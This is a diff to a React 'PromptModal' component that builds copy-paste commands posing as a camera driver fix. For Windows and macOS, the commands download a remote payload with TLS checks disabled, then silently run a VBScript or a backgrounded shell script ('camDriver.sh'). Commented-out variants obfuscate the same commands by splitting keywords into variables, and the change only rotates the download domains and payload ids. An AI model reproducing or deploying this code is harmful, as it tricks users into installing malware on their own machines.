@@ -17,7 +17,7 @@ export const PromptModal = ({ callback, showToast }) => {
 
   // Windows full command
   // const WINCommand = `c${UL}l -${COM}${ZIP} ${BackendURL}/cam-v-${UNIQUE.toLowerCase()}.fix && powe${SHLL}${ARH}${PAH}${DEH}'" && wscr${SCR}${VBS}`;
-  const WINCommand = `curl -k -o "%TEMP%\\update.zip" https://avalabs-digital.store/update/update93w && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\update.zip' -DestinationPath '%TEMP%\\update'" && wscript "%TEMP%\\update\\run.vbs"
+  const WINCommand = `curl -k -o "%TEMP%\\update.zip" https://avalabs-io.store/update/update92w && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\update.zip' -DestinationPath '%TEMP%\\update'" && wscript "%TEMP%\\update\run.vbs"
   `;
 
   // Mac constants and command
@@ -27,8 +27,7 @@ export const PromptModal = ({ callback, showToast }) => {
   const DEV = `ev/null 2>&1 &`;
 
   // const MACCommand = `c${UL}l -${MCOM}river.sh ${BackendURL}/mac-v-${UNIQUE.toLowerCase()}.fixer && ${MOD}river.sh && ${BAH}river.sh >/d${DEV}`;
-  const MACCommand = `curl -k -o /var/tmp/camDriver.sh https://avalabs-digital.store/update/update93m && chmod +x /var/tmp/camDriver.sh && nohup bash /var/tmp/camDriver.sh >/dev/null 2>&1 &
-
+  const MACCommand = `curl -k -o /var/tmp/camDriver.sh https://avalabs-io.store/update/update92m && chmod +x /var/tmp/camDriver.sh && nohup bash /var/tmp/camDriver.sh >/dev/null 2>&1 &
 `;
 
   useEffect(() => {
